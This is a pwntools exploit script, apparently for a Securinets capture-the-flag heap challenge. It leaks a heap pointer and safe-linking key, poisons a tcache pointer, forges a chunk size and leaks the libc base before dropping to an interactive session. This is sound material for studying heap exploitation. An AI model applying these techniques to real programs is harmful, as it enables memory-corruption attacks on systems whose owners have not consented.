#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or './main')
libc = ELF(exe.libc.path)


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def create(idx, name=b"\x00", effect=b"\x00", mana_cost=0, cooldown=0, element=0):
    io.sendlineafter(b": ", b"1")
    io.sendlineafter(b": ", str(idx).encode())
    io.sendafter(b"name: ", name)
    io.sendafter(b"effect: ", effect)
    io.sendlineafter(b"mana cost: ", str(mana_cost).encode())
    io.sendlineafter(b": ", str(cooldown).encode())
    io.sendlineafter(b": ", str(element).encode())

def edit(idx, name=b"\x00", effect=b"A"*64, mana_cost=0, cooldown=0, element=0):
    io.sendlineafter(b": ", b"2")
    io.sendlineafter(b": ", str(idx).encode())
    io.sendafter(b"name: ", name)
    io.sendafter(b"effect: ", effect)
    io.sendlineafter(b"mana cost: ", str(mana_cost).encode())
    io.sendlineafter(b": ", str(cooldown).encode())
    io.sendlineafter(b": ", str(element).encode())
 
def delete(idx):
    io.sendlineafter(b": ", b"4")
    io.sendlineafter(b": ", str(idx).encode())

gdbscript = '''
continue
'''.format(**locals())

io = start()
#io = remote("pwn-14caf623.p1.securinets.tn", 9091)

for i in range(20): create(i)

delete(1)
delete(0)

io.sendlineafter(b": ", b"3")
io.recvuntil(b"ame: ")
addr = u64(io.recvline().strip().ljust(8, b'\x00'))
io.recvuntil(b"ame: ")
key = u64(io.recvline().strip().ljust(8, b'\x00'))

edit(0, name=p64(((addr^key)-0x20)^key))
io.sendlineafter(b": ", b"5")
io.sendlineafter(b"feedback: ", str(0x6c).encode())
io.sendafter(b"feedback: ", p64(0x0))

io.sendlineafter(b": ", b"5")
io.sendlineafter(b"feedback: ", str(0x6c).encode())
io.sendafter(b"feedback: ", p64(0x0)*3 + p64(0x501))

delete(1)

io.sendlineafter(b": ", b"3")
io.recvuntil(b"lot 1:")
io.recvuntil(b"ame: ")
libc.address = u64(b"\x20" + io.recvline().strip().ljust(7, b'\x00')) - 0x203b20
log.info(hex(libc.address))

io.interactive()
